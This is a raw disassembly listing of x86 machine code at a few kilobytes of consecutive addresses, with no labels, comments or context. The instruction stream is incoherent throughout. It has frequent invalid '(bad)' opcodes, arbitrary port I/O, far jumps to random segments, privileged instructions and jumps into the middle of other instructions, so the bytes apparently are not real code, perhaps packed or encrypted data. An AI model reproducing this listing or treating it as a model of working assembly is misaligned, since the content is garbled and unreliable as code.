  413b5c:	sub    eax,DWORD PTR [ecx-0x38]
  413b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b60:	jecxz  0x413b40
  413b62:	repz jmp 0x46f8:0xd2d6e11b
  413b6a:	in     al,0xd
  413b6c:	dec    ebx
  413b6d:	mov    ch,0x96
  413b6f:	xchg   edx,eax
  413b70:	stos   BYTE PTR es:[edi],al
  413b71:	in     eax,dx
  413b72:	mov    ebx,0x3a4d4bfc
  413b77:	mov    edi,0x1108e7d3
  413b7c:	jecxz  0x413b3b
  413b7e:	imul   ecx,DWORD PTR [edi-0x51],0xffffffe0
  413b82:	aas    
  413b83:	and    eax,0xf28368a
  413b88:	out    0xd3,al
  413b8a:	fbstp  TBYTE PTR [eax+0x6a250923]
  413b90:	push   es
  413b91:	cmp    al,BYTE PTR [eax]
  413b93:	loopne 0x413b99
  413b95:	inc    eax
  413b96:	or     BYTE PTR [eax+0x2c2e7267],0x9a
  413b9d:	push   ds
  413b9e:	aaa    
  413b9f:	ss cmc 
  413ba1:	popa   
  413ba2:	popf   
  413ba3:	loope  0x413b5f
  413ba5:	and    dl,ch
  413ba7:	stc    
  413ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ba9:	sub    DWORD PTR [edx-0x17464a30],ebp
  413baf:	push   ecx
  413bb0:	pusha  
  413bb1:	into   
  413bb2:	cmp    esp,DWORD PTR [ebp-0x3a194c70]
  413bb8:	xchg   esp,eax
  413bb9:	in     eax,0x6b
  413bbb:	rol    BYTE PTR [esi-0x3eb7ac9f],1
  413bc1:	xchg   DWORD PTR ds:0x9f22425e,eax
  413bc7:	adc    eax,0xe7247596
  413bcc:	clc    
  413bcd:	and    al,0xd1
  413bcf:	fwait
  413bd0:	cmp    esi,esi
  413bd2:	xor    cl,dl
  413bd4:	inc    edi
  413bd5:	mov    ebp,ss
  413bd7:	jne    0x413b6a
  413bd9:	add    eax,0xf5efcb40
  413bde:	mov    cl,0xdd
  413be0:	inc    esi
  413be1:	ins    BYTE PTR es:[edi],dx
  413be2:	retf   0x912b
  413be5:	mov    ch,0x4d
  413be7:	and    al,0xec
  413be9:	xchg   esi,eax
  413bea:	push   0x6
  413bec:	mov    edi,0xb709c4fb
  413bf1:	(bad)  
  413bf2:	outs   dx,BYTE PTR ds:[esi]
  413bf3:	jle    0x413c03
  413bf5:	iret   
  413bf6:	adc    BYTE PTR [edx-0x68],al
  413bf9:	fst    QWORD PTR [esi-0x3d62ce63]
  413bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c01:	xchg   DWORD PTR [esp+esi*4],esp
  413c04:	js     0x413c2e
  413c06:	fyl2x  
  413c08:	push   ss
  413c09:	pop    ss
  413c0a:	fsub   QWORD PTR [ebx+0x38a21d0c]
  413c10:	sbb    al,0xd5
  413c12:	sub    eax,0x21c7586b
  413c17:	xchg   ecx,eax
  413c18:	mov    ch,0x8d
  413c1a:	or     DWORD PTR [eax],ecx
  413c1c:	inc    eax
  413c1d:	sbb    DWORD PTR [ebx+0xda8736a],ecx
  413c23:	inc    ecx
  413c24:	fist   WORD PTR [ebp+0x14]
  413c27:	mov    eax,0xd8ca6a3b
  413c2c:	mov    DWORD PTR [ecx+edi*4-0x6d],ecx
  413c30:	mov    ds:0x4aae105d,al
  413c35:	aad    0x8d
  413c37:	jle    0x413c16
  413c39:	jmp    0x586916a8
  413c3e:	retf   
  413c3f:	lock and eax,0x2383b615
  413c45:	fsubr  QWORD PTR [ebp-0x6ff4af88]
  413c4b:	je     0x413c2c
  413c4d:	xchg   BYTE PTR [ebp+0x2190292f],ch
  413c53:	jecxz  0x413be9
  413c55:	add    al,0x5
  413c57:	ficom  WORD PTR [eax-0x31]
  413c5a:	out    dx,eax
  413c5b:	add    al,0x3f
  413c5d:	mov    al,ds:0x5e88f23
  413c62:	mov    cl,0x2f
  413c64:	call   DWORD PTR [ebp-0x767302ff]
  413c6a:	cld    
  413c6b:	inc    ebp
  413c6c:	shl    BYTE PTR [ebx-0x68],1
  413c6f:	xchg   edi,eax
  413c70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c71:	mov    ds:0xafe18bcc,eax
  413c76:	and    bl,BYTE PTR [ecx-0x26]
  413c79:	std    
  413c7a:	cld    
  413c7b:	jns    0x413c8b
  413c7d:	mov    edx,0x4bc5e69f
  413c82:	dec    edi
  413c83:	and    ah,BYTE PTR [ebx*1-0x57879bf5]
  413c8a:	rol    DWORD PTR [eax-0x56],0xa7
  413c8e:	je     0x413c47
  413c90:	js     0x413c3f
  413c92:	and    eax,0x1de36add
  413c97:	std    
  413c98:	sub    DWORD PTR [ebp+ecx*1-0x7f],eax
  413c9c:	fdivr  st(5),st
  413c9e:	sbb    dl,ah
  413ca0:	dec    edx
  413ca1:	xchg   esp,eax
  413ca2:	mov    esp,0x70e29542
  413ca7:	(bad)  
  413ca8:	sar    BYTE PTR [ebp+0x518b8265],1
  413cae:	gs icebp 
  413cb0:	lock xchg esp,eax
  413cb2:	pop    ebx
  413cb3:	push   esi
  413cb4:	xor    al,0x6
  413cb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cb7:	jmp    0x263b:0xf446eff6
  413cbe:	and    DWORD PTR [ebx-0x5ecddfae],eax
  413cc4:	leave  
  413cc5:	(bad)  
  413cc6:	adc    al,0xc3
  413cc8:	dec    edi
  413cc9:	iret   
  413cca:	inc    eax
  413ccb:	mov    al,0xa5
  413ccd:	sub    eax,0x24394a27
  413cd2:	cdq    
  413cd3:	inc    ebx
  413cd4:	lods   al,BYTE PTR ds:[esi]
  413cd5:	aam    0x93
  413cd7:	and    BYTE PTR [eax+edx*4+0x1f],ch
  413cdb:	mov    edx,0x29c3461d
  413ce0:	cmp    BYTE PTR [ecx-0x304340c9],cl
  413ce6:	sti    
  413ce7:	pop    esp
  413ce8:	in     al,dx
  413ce9:	push   es
  413cea:	sbb    esi,edx
  413cec:	cmc    
  413ced:	xchg   esi,eax
  413cee:	mov    ah,0x7d
  413cf0:	mov    DWORD PTR [edi-0x605d360],esi
  413cf6:	cwde   
  413cf7:	mov    bl,0x63
  413cf9:	pop    eax
  413cfa:	mov    bl,0xe
  413cfc:	push   esp
  413cfd:	xchg   DWORD PTR [edi],ebx
  413cff:	jg     0x413d4a
  413d01:	mov    edi,0xa59737dc
  413d06:	(bad)  
  413d07:	jecxz  0x413d73
  413d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d0a:	mov    dh,0x15
  413d0c:	mov    al,ds:0xb4780aa6
  413d11:	and    esp,DWORD PTR [edi]
  413d13:	xchg   ecx,eax
  413d14:	icebp  
  413d15:	jmp    0x413d24
  413d17:	popf   
  413d18:	xor    edi,edx
  413d1a:	or     eax,0x4cfa8d99
  413d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d20:	pop    edi
  413d21:	lahf   
  413d22:	call   DWORD PTR [ecx-0x2d]
  413d25:	lods   eax,DWORD PTR ds:[esi]
  413d26:	test   BYTE PTR [eax+0x3b],dl
  413d29:	fwait
  413d2a:	dec    edx
  413d2b:	push   ss
  413d2c:	aad    0xf6
  413d2e:	sbb    DWORD PTR [eax+0x1432baa9],0x1b
  413d35:	pusha  
  413d36:	push   ds
  413d37:	and    eax,0x9e3d8e4b
  413d3c:	xchg   DWORD PTR [ebx-0x3cc5767d],edx
  413d42:	daa    
  413d43:	push   0x5459f64e
  413d48:	mov    DWORD PTR [ecx+0x3a20516],ecx
  413d4e:	leave  
  413d4f:	lahf   
  413d50:	jge    0x413d7e
  413d52:	dec    ebx
  413d53:	int    0xc3
  413d55:	les    ecx,FWORD PTR [eax-0x2d7ac531]
  413d5b:	cdq    
  413d5c:	mov    ah,al
  413d5e:	jb     0x413d0e
  413d60:	out    0xa3,al
  413d62:	jmp    0x413d60
  413d64:	ret    
  413d65:	fwait
  413d66:	js     0x413d87
  413d68:	loopne 0x413cf4
  413d6a:	and    al,0xdb
  413d6c:	cmp    dl,dh
  413d6e:	mov    WORD PTR [ebp+0x22],es
  413d71:	jle    0x413dc1
  413d73:	push   ebx
  413d74:	push   ds
  413d75:	dec    edi
  413d76:	sbb    BYTE PTR [ebx],bl
  413d78:	js     0x413d11
  413d7a:	jb     0x413dd4
  413d7c:	sbb    dh,BYTE PTR [edx-0x71df5415]
  413d82:	test   BYTE PTR [eax-0xe],cl
  413d85:	(bad)  
  413d87:	xor    dh,bh
  413d89:	addr16 add al,0x22
  413d8c:	dec    esp
  413d8d:	and    bl,cl
  413d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d90:	or     bh,BYTE PTR [edi+0x48]
  413d93:	push   ds
  413d94:	out    dx,al
  413d95:	add    DWORD PTR [edx+eax*1+0x54],0x78
  413d9a:	imul   edi,DWORD PTR [ecx],0xffffffbc
  413d9d:	jb     0x413dd5
  413d9f:	xor    BYTE PTR [ebx-0x73],bl
  413da2:	popw   ds
  413da4:	add    esp,DWORD PTR [ebx]
  413da6:	pop    ss
  413da7:	or     BYTE PTR [edi-0x74],ch
  413daa:	push   cs
  413dab:	int3   
  413dac:	ins    BYTE PTR es:[edi],dx
  413dad:	jmp    0x413e19
  413daf:	dec    ecx
  413db0:	mov    cl,BYTE PTR [ebx+eiz*2-0x1f]
  413db4:	mov    ch,0xd7
  413db6:	mov    ecx,edi
  413db8:	cli    
  413db9:	ins    DWORD PTR es:[edi],dx
  413dba:	into   
  413dbb:	out    0xf7,al
  413dbd:	ins    BYTE PTR es:[edi],dx
  413dbe:	adc    DWORD PTR [esi+esi*4-0x4ee4dd72],ebx
  413dc5:	sti    
  413dc6:	mov    ecx,0xf605535e
  413dcb:	push   ebx
  413dcc:	xchg   ebx,eax
  413dcd:	sar    BYTE PTR [eax],0xf2
  413dd0:	dec    eax
  413dd1:	test   ebp,0x7ba7c928
  413dd7:	repz adc bh,ah
  413dda:	into   
  413ddb:	out    0xd2,eax
  413ddd:	sbb    al,0x3
  413ddf:	repnz mov al,ds:0xe413bbdc
  413de5:	inc    ebx
  413de6:	or     al,0x64
  413de8:	xchg   ebx,eax
  413de9:	idiv   BYTE PTR [ecx-0x3f6f5490]
  413def:	sbb    ecx,DWORD PTR [edi]
  413df1:	stos   BYTE PTR es:[edi],al
  413df2:	inc    esi
  413df3:	mov    ds:0xaba2896,al
  413df8:	in     eax,0xdd
  413dfa:	xchg   edi,eax
  413dfb:	cmp    ch,BYTE PTR [edx-0x75]
  413dfe:	shl    DWORD PTR [ebp+0x4c],cl
  413e01:	jecxz  0x413d98
  413e03:	and    al,0x27
  413e05:	pop    edi
  413e06:	xor    al,0xa7
  413e08:	out    0x4b,eax
  413e0a:	adc    BYTE PTR [ebx+0x7d07040f],ch
  413e10:	jle    0x413e38
  413e12:	ins    BYTE PTR es:[edi],dx
  413e13:	test   BYTE PTR [edx],al
  413e15:	enter  0xcf9a,0x73
  413e19:	sahf   
  413e1a:	and    bh,BYTE PTR [eax-0x398e7329]
  413e20:	push   0xf0de7134
  413e25:	ret    
  413e26:	push   es
  413e27:	mov    bl,0xb3
  413e29:	ss aas 
  413e2b:	or     al,0xf3
  413e2d:	(bad)  
  413e2e:	jb     0x413e66
  413e30:	sub    eax,0x86f996bd
  413e35:	push   edi
  413e36:	imul   edx,edi,0xffffffdb
  413e39:	adc    al,0x79
  413e3b:	sub    edi,edx
  413e3d:	inc    ecx
  413e3e:	jb     0x413eb6
  413e40:	push   cs
  413e41:	out    dx,eax
  413e42:	ds or  esp,ecx
  413e45:	add    DWORD PTR [edx],edi
  413e47:	adc    DWORD PTR ds:0x4820c5ed,edx
  413e4d:	or     BYTE PTR [edx-0xb],ah
  413e50:	or     esi,edx
  413e52:	cmp    BYTE PTR [ebp-0x46],cl
  413e55:	sbb    DWORD PTR [edi+0x5fd2b2ce],ebp
  413e5b:	sahf   
  413e5c:	test   DWORD PTR [esp+eax*8+0x96a5da8],edx
  413e63:	dec    eax
  413e64:	add    BYTE PTR ds:0x2fe7b7ba,al
  413e6b:	int    0x17
  413e6d:	cwde   
  413e6e:	push   esp
  413e6f:	xor    BYTE PTR [edi+edi*1],ch
  413e72:	pop    ebp
  413e73:	rol    BYTE PTR [ecx-0x36ff16c5],1
  413e79:	(bad)
  413e7c:	push   cs
  413e7d:	pop    ebx
  413e7e:	lods   eax,DWORD PTR ds:[esi]
  413e7f:	or     ch,bh
  413e81:	pop    es
  413e82:	ret    
  413e83:	int    0x4e
  413e85:	adc    esi,DWORD PTR [ebx+0x77]
  413e88:	xor    al,0xa3
  413e8a:	jecxz  0x413e84
  413e8c:	es je  0x413ec8
  413e8f:	xchg   ebp,eax
  413e90:	mov    ebx,0xb3b5296c
  413e95:	pop    esp
  413e96:	pusha  
  413e97:	mov    ebp,0x9d192f5d
  413e9c:	hlt    
  413e9d:	mov    al,dh
  413e9f:	mov    eax,ds:0xd4bf4a60
  413ea4:	fstp   st(7)
  413ea6:	xor    al,dl
  413ea8:	mov    BYTE PTR [edx],dl
  413eaa:	ins    BYTE PTR es:[edi],dx
  413eab:	repz call 0x3c51:0x8b81656b
  413eb3:	or     dl,bh
  413eb5:	jno    0x413efb
  413eb7:	fstp   TBYTE PTR [ebx-0x53fc6854]
  413ebd:	mov    ah,0x98
  413ebf:	enter  0x1a3b,0x49
  413ec3:	(bad)  
  413ec4:	outs   dx,DWORD PTR ds:[esi]
  413ec5:	push   cs
  413ec6:	inc    eax
  413ec7:	fdivr  QWORD PTR [ecx-0x79]
  413eca:	pushf  
  413ecb:	aad    0xcf
  413ecd:	push   eax
  413ece:	test   BYTE PTR [esi],al
  413ed0:	pop    ss
  413ed1:	inc    ecx
  413ed2:	imul   edx,DWORD PTR [eax+0x4a],0x20
  413ed6:	inc    ecx
  413ed7:	es mov ch,0x8e
  413eda:	inc    ebp
  413edb:	dec    esp
  413edc:	data16 js 0x413ec9
  413edf:	fistp  WORD PTR [edi-0xa4775a1]
  413ee5:	pop    ebp
  413ee6:	ja     0x413e8d
  413ee8:	dec    ebp
  413ee9:	adc    al,0x30
  413eeb:	fsub   DWORD PTR [edi+0x280b81f6]
  413ef1:	hlt    
  413ef2:	sbb    BYTE PTR [esi-0x2fd7fde4],ch
  413ef8:	xor    eax,0x954a204e
  413efd:	jae    0x413f0d
  413eff:	cmp    al,0x69
  413f01:	mov    cl,0xcd
  413f03:	test   BYTE PTR [ebx],0xdb
  413f06:	ja     0x413f0f
  413f08:	fistp  QWORD PTR [edx+0xee03ed1]
  413f0e:	jmp    0xd0bc:0xa2058872
  413f15:	pop    ds
  413f16:	or     al,0x46
  413f18:	repnz add BYTE PTR [ebx],bh
  413f1b:	lahf   
  413f1c:	jl     0x413f04
  413f1e:	lods   al,BYTE PTR ds:[esi]
  413f1f:	mov    WORD PTR [edi+0x6c9dad0],gs
  413f25:	mov    edx,edx
  413f27:	clc    
  413f28:	sahf   
  413f29:	mov    ds:0x6a2cddda,eax
  413f2e:	xchg   ebp,ecx
  413f30:	aam    0x3a
  413f32:	inc    esi
  413f33:	(bad)  
  413f34:	lahf   
  413f35:	lods   al,BYTE PTR ds:[esi]
  413f36:	sub    esp,edx
  413f38:	scas   eax,DWORD PTR es:[edi]
  413f39:	sbb    ecx,DWORD PTR [edi+0x2c]
  413f3c:	jb     0x413f66
  413f3e:	sub    eax,0xe1665881
  413f43:	(bad)  
  413f44:	fnstsw WORD PTR [edx*2-0x2ae666a2]
  413f4b:	push   0x3bee026e
  413f50:	xor    ch,bh
  413f52:	sbb    ah,BYTE PTR [edx+0x3025134b]
  413f58:	popa   
  413f59:	cmp    dl,cl
  413f5b:	xor    eax,0x1f60e51d
  413f60:	and    DWORD PTR [edx+0x2c],esi
  413f63:	pop    edx
  413f64:	xor    al,dl
  413f66:	push   ds
  413f67:	out    0x25,al
  413f69:	mov    ebp,DWORD PTR [esp+edi*2-0x5331148a]
  413f70:	imul   ebx,DWORD PTR [ebx-0x37],0x85baa4ec
  413f77:	test   bh,dl
  413f79:	mov    ebx,0x2cfae22c
  413f7e:	sub    eax,0x24075672
  413f83:	fcmovnb st,st(4)
  413f85:	les    ebp,FWORD PTR ds:0xd3ac776f
  413f8b:	rol    DWORD PTR [eax+0x1c],1
  413f8e:	les    esi,FWORD PTR [edi]
  413f90:	clc    
  413f91:	jmp    0x413ff3
  413f93:	push   ebp
  413f94:	jnp    0x413f55
  413f96:	hlt    
  413f97:	je     0x413fe6
  413f99:	mov    edi,0x729e6b52
  413f9e:	or     BYTE PTR [edi-0x27e7395c],0x40
  413fa5:	test   BYTE PTR [esi-0x64],0xe3
  413fa9:	sub    dl,ch
  413fab:	cmp    bl,0x47
  413fae:	(bad)  [ecx-0x36]
  413fb1:	push   ecx
  413fb2:	mov    ecx,DWORD PTR [ebx]
  413fb4:	cli    
  413fb5:	fdiv   DWORD PTR es:0xa7c6c528
  413fbc:	xchg   esp,eax
  413fbd:	lahf   
  413fbe:	dec    si
  413fc0:	inc    edi
  413fc1:	fwait
  413fc2:	mov    BYTE PTR [eiz*2-0x6717bb07],0xf1
  413fca:	fcmovnb st,st(0)
  413fcc:	(bad)  
  413fcd:	and    BYTE PTR [ecx],al
  413fcf:	mov    ah,0x55
  413fd1:	and    edi,ebp
  413fd3:	leave  
  413fd4:	idiv   edi
  413fd6:	jg     0x413fa9
  413fd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fd9:	add    al,BYTE PTR [edi]
  413fdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fdc:	sub    DWORD PTR [edi-0x6d],esp
  413fdf:	into   
  413fe0:	int3   
  413fe1:	push   edx
  413fe2:	dec    ebx
  413fe3:	ja     0x414011
  413fe5:	jnp    0x414037
  413fe7:	(bad)
  413fea:	arpl   WORD PTR [edi+0x6c],si
  413fed:	push   es
  413fee:	mov    ?,WORD PTR [edi+0x6eb4050b]
  413ff4:	lds    ebp,FWORD PTR [ecx]
  413ff6:	pop    es
  413ff7:	sbb    BYTE PTR [eax-0x31f1215a],cl
  413ffd:	or     DWORD PTR [edx],edi
  413fff:	stc    
  414000:	mov    bl,dh
  414002:	sub    dl,BYTE PTR [edx-0x17]
  414005:	pushf  
  414006:	cmc    
  414007:	sar    DWORD PTR [ebp+0x4f],cl
  41400a:	jl     0x41407d
  41400c:	stos   DWORD PTR es:[edi],eax
  41400d:	pop    ds
  41400e:	cmp    DWORD PTR [edx-0x23],ebp
  414011:	dec    eax
  414012:	xor    al,0x42
  414014:	jecxz  0x414089
  414016:	shl    BYTE PTR [ecx+0x77],0xbb
  41401a:	jp     0x413faf
  41401c:	cwde   
  41401d:	call   0xcc9985ec
  414022:	dec    edi
  414023:	cmp    DWORD PTR [ebx+0x7eb72213],esp
  414029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41402a:	sub    eax,0x16bafb60
  41402f:	push   edx
  414030:	outs   dx,BYTE PTR ds:[esi]
  414031:	push   ebp
  414032:	push   edi
  414033:	sub    ah,bh
  414035:	inc    esp
  414036:	(bad)  
  414037:	mov    WORD PTR [edi-0x5881768b],cs
  41403d:	push   ecx
  41403e:	pop    esp
  41403f:	out    dx,al
  414040:	push   esp
  414041:	pop    ds
  414042:	add    dl,cl
  414044:	jb     0x4140b5
  414046:	aam    0x1f
  414048:	push   es
  414049:	dec    ebp
  41404a:	test   eax,edx
  41404c:	aam    0xbf
  41404e:	imul   bh
  414050:	addr16 cdq 
  414052:	mov    bh,0xe0
  414054:	push   eax
  414055:	test   eax,0x8641760
  41405a:	sbb    cl,al
  41405c:	enter  0xcd72,0x45
  414060:	dec    ebx
  414061:	mov    bh,0x77
  414063:	rcr    DWORD PTR [ebp-0x67],cl
  414066:	mov    bh,0x5
  414069:	inc    esp
  41406a:	sub    dh,ch
  41406c:	pop    ebx
  41406d:	mov    ebp,0x42aff136
  414072:	gs or  eax,0x4b1229
  414078:	xchg   esi,eax
  414079:	(bad)  
  41407a:	icebp  
  41407b:	shl    DWORD PTR [ebx],1
  41407d:	pop    ebp
  41407e:	je     0x414097
  414080:	xor    eax,0xf1f3ff10
  414085:	xor    al,0xdc
  414087:	test   DWORD PTR [edx+eax*2],esi
  41408a:	std    
  41408b:	cld    
  41408c:	pop    ecx
  41408d:	in     eax,0x81
  41408f:	sub    al,ah
  414091:	inc    edx
  414092:	shr    BYTE PTR [ecx+edx*4],cl
  414095:	inc    ebx
  414096:	inc    edi
  414097:	jmp    0x9491f19c
  41409c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41409d:	mov    al,BYTE PTR ss:[ecx]
  4140a0:	cmp    DWORD PTR [edx+0x606d0ae0],esi
  4140a6:	dec    ebp
  4140a7:	inc    edx
  4140a8:	and    al,BYTE PTR [ebx]
  4140aa:	imul   eax,DWORD PTR [ebx+0x60612f78],0x5b
  4140b1:	cs xor edx,ebx
  4140b4:	ins    DWORD PTR es:[edi],dx
  4140b5:	add    DWORD PTR [ebx],ecx
  4140b7:	and    edi,DWORD PTR [eax+edx*2+0x74]
  4140bb:	add    esi,DWORD PTR [edi-0x69defc0e]
  4140c1:	xor    eax,0xdbf82581
  4140c6:	icebp  
  4140c7:	xchg   ebx,eax
  4140c8:	xchg   ecx,eax
  4140c9:	in     al,0xf8
  4140cb:	loop   0x4140f2
  4140cd:	xchg   esi,eax
  4140ce:	push   ecx
  4140cf:	addr16 dec ebx
  4140d1:	mov    bh,0x1d
  4140d3:	xchg   DWORD PTR [ecx-0x101c2352],ecx
  4140d9:	xchg   ebx,eax
  4140da:	xchg   ebp,eax
  4140db:	pop    ecx
  4140dc:	pop    ebp
  4140dd:	cmp    BYTE PTR [edi+0x7a8eec0b],bh
  4140e3:	add    BYTE PTR [edx],ch
  4140e5:	xor    ebx,DWORD PTR [ecx]
  4140e7:	ror    DWORD PTR [esi+0x30],cl
  4140ea:	pop    edi
  4140eb:	jb     0x414167
  4140ed:	shr    BYTE PTR ds:0x59d5cfbd,0xcd
  4140f4:	inc    eax
  4140f5:	and    ebp,DWORD PTR ss:[ebx]
  4140f8:	std    
  4140f9:	shr    DWORD PTR [esi],0xbb
  4140fc:	in     eax,0x24
  4140fe:	jecxz  0x4140b9
  414100:	dec    edx
  414101:	jno    0x41411e
  414103:	imul   edx,DWORD PTR [ebp-0x54],0xa4a41eb2
  41410a:	xchg   DWORD PTR [edi-0x7ba3c5be],edx
  414110:	jecxz  0x41412f
  414112:	jmp    0x4140ec
  414114:	cmc    
  414115:	cmp    DWORD PTR ds:0xe2a89394,ecx
  41411b:	inc    ecx
  41411c:	mov    WORD PTR ds:0xc502c21,fs
  414122:	and    DWORD PTR [bx+di],edx
  414125:	jle    0x41417d
  414127:	cmp    eax,0xeb221cff
  41412c:	cmp    edi,ebx
  41412e:	stos   DWORD PTR es:[edi],eax
  41412f:	mov    ds:0x46f4c45f,eax
  414134:	adc    BYTE PTR [ebp+0x463fd4c3],cl
  41413a:	sbb    al,0x77
  41413c:	jmp    0x4141a3
  41413e:	ja     0x4140da
  414140:	push   ss
  414141:	jge    0x4140e2
  414143:	add    eax,0x2ac5cbb5
  414148:	call   0x7f7d:0x763bcb23
  41414f:	xor    BYTE PTR [edx+0x586659f7],0xe5
  414156:	and    bh,BYTE PTR [esi]
  414158:	sub    al,0x7d
  41415a:	sbb    dh,dl
  41415c:	and    BYTE PTR [ecx+eax*8+0x1dff3eeb],bh
  414163:	aam    0x21
  414165:	push   ebx
  414166:	add    bh,BYTE PTR [ebp-0x7d74ad84]
  41416c:	push   0xbefa6fc7
  414171:	outs   dx,BYTE PTR ds:[esi]
  414172:	cmp    eax,0x93efedd
  414177:	jns    0x414160
  414179:	(bad)  
  41417a:	test   eax,0xa29cbd30
  41417f:	or     ecx,DWORD PTR [eax-0x55]
  414182:	push   0x9a2d1e9e
  414187:	stos   DWORD PTR es:[edi],eax
  414188:	pop    edi
  414189:	jg     0x41418c
  41418b:	mov    cl,0xd7
  41418d:	mov    DWORD PTR [ecx-0x6c],ebp
  414190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414191:	imul   ebx,edx,0x23
  414194:	and    DWORD PTR [eax],0xf31f226c
  41419a:	xor    al,0xdc
  41419c:	pop    ds
  41419d:	outs   dx,DWORD PTR ds:[esi]
  41419e:	sub    BYTE PTR [edx],bl
  4141a0:	ins    BYTE PTR es:[edi],dx
  4141a1:	xor    bl,dh
  4141a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141a4:	cli    
  4141a5:	push   ss
  4141a6:	pop    eax
  4141a7:	fs in  eax,0x8
  4141aa:	rcl    BYTE PTR [edi],0xb2
  4141ad:	mov    ebp,0x45812f5d
  4141b2:	mov    ah,0xfe
  4141b4:	loope  0x4141b2
  4141b6:	mov    ecx,DWORD PTR [bp+di-0x2a3a]
  4141bb:	mov    esp,0x131004aa
  4141c0:	cmp    bh,BYTE PTR [eax-0x4]
  4141c3:	cwde   
  4141c4:	jecxz  0x414214
  4141c6:	icebp  
  4141c7:	outs   dx,DWORD PTR ds:[esi]
  4141c8:	mov    WORD PTR [ebp-0x2f],ss
  4141cb:	add    ch,bl
  4141cd:	xchg   esp,eax
  4141ce:	ret    
  4141cf:	in     al,0xe2
  4141d1:	pop    esp
  4141d2:	int    0x95
  4141d4:	lahf   
  4141d5:	add    DWORD PTR [ecx-0x43],0xe616ff09
  4141dc:	lock or eax,0x5e7ca41e
  4141e2:	adc    BYTE PTR [eax+edx*8+0x70085c42],al
  4141e9:	mov    eax,0x25f5f010
  4141ee:	xor    BYTE PTR [esi],dh
  4141f0:	mov    WORD PTR [ebx],ss
  4141f2:	dec    esp
  4141f3:	sbb    ah,al
  4141f5:	rol    BYTE PTR [edx+0x19b461be],0xf5
  4141fc:	mov    bl,0x38
  4141fe:	(bad)  
  4141ff:	and    eax,0x51b1975b
  414204:	inc    eax
  414205:	mov    al,ds:0x9ba09962
  41420a:	(bad)  
  41420b:	cmc    
  41420c:	pop    esi
  41420d:	push   ecx
  41420e:	adc    ah,BYTE PTR [ebx-0x72087979]
  414214:	and    BYTE PTR [ebx+0x1c],al
  414217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414218:	mov    esp,0xfabb9d1f
  41421d:	inc    esp
  41421e:	int    0x8a
  414220:	pop    ebx
  414221:	std    
  414222:	adc    dh,BYTE PTR [esi-0x59]
  414225:	xor    al,0xb
  414227:	inc    edi
  414228:	jae    0x4142a0
  41422a:	lods   al,BYTE PTR ds:[esi]
  41422b:	hlt    
  41422c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41422d:	sbb    al,0x82
  41422f:	xchg   DWORD PTR [edi],eax
  414231:	sub    eax,0x4b0fa2e
  414236:	cmp    al,0xd8
  414238:	call   0xe5cac8f7
  41423d:	loop   0x414245
  41423f:	into   
  414240:	sbb    bl,cl
  414242:	mov    eax,0xd726ae0e
  414247:	out    0xad,al
  414249:	data16 sub al,0xa0
  41424c:	je     0x41428d
  41424e:	data16 and BYTE PTR [edi+0x60],0xb
  414253:	jns    0x414203
  414255:	xchg   ecx,eax
  414256:	add    eax,0xa3977761
  41425b:	jnp    0x41424f
  41425d:	out    0x8,al
  41425f:	dec    eax
  414260:	das    
  414261:	sub    eax,DWORD PTR fs:[edi]
  414264:	mov    bl,0xba
  414266:	mov    ebx,0xe09e2cca
  41426b:	stos   DWORD PTR es:[edi],eax
  41426c:	inc    ebp
  41426d:	or     edi,edx
  41426f:	fldcw  WORD PTR [esi]
  414271:	les    eax,FWORD PTR [esi+0x68]
  414274:	mov    ch,0xf2
  414276:	xchg   edx,eax
  414277:	and    esi,DWORD PTR [ebx-0x7a]
  41427a:	out    0x5c,eax
  41427c:	repnz push cs
  41427e:	retf   
  41427f:	add    BYTE PTR [ecx-0x3603de27],al
  414285:	pop    ebp
  414286:	aaa    
  414287:	push   esp
  414288:	jle    0x4142d3
  41428a:	das    
  41428b:	cwde   
  41428c:	loope  0x4142c7
  41428e:	aas    
  41428f:	pop    edi
  414290:	bound  eax,QWORD PTR [esi+0x308017f]
  414296:	pop    edi
  414297:	pop    ebx
  414299:	in     al,0x29
  41429b:	lds    edi,FWORD PTR [esi+ebp*8]
  41429e:	pop    es
  41429f:	mov    ds:0xc81526a8,eax
  4142a4:	aam    0xea
  4142a6:	ja     0x414260
  4142a8:	or     al,0x65
  4142aa:	xchg   esp,esi
  4142ac:	cdq    
  4142ad:	fiadd  WORD PTR [edx-0x5c]
  4142b0:	fs lock push ss
  4142b3:	jns    0x414314
  4142b5:	out    dx,al
  4142b6:	sub    eax,0xda451118
  4142bb:	add    DWORD PTR [ebp+ebp*8-0x2a],edx
  4142bf:	js     0x41429b
  4142c1:	jo     0x41424c
  4142c3:	ficom  DWORD PTR [ecx-0x19]
  4142c6:	cli    
  4142c7:	xor    dl,BYTE PTR [ecx+0x3a]
  4142ca:	mov    ch,BYTE PTR [edi-0x4b]
  4142cd:	xchg   edx,eax
  4142ce:	sub    BYTE PTR [ecx],ch
  4142d0:	(bad)  
  4142d1:	aaa    
  4142d2:	jbe    0x414340
  4142d4:	shl    DWORD PTR [ecx],cl
  4142d6:	or     BYTE PTR [edx-0x65],ch
  4142d9:	cmp    eax,ebx
  4142db:	daa    
  4142dc:	pop    ecx
  4142dd:	div    DWORD PTR [edi-0x57]
  4142e0:	addr16 repz inc edi
  4142e3:	loopne 0x4142de
  4142e5:	xchg   ebx,eax
  4142e6:	leave  
  4142e7:	cs daa 
  4142e9:	push   0x7df5f60b
  4142ee:	push   ebx
  4142ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142f0:	je     0x414313
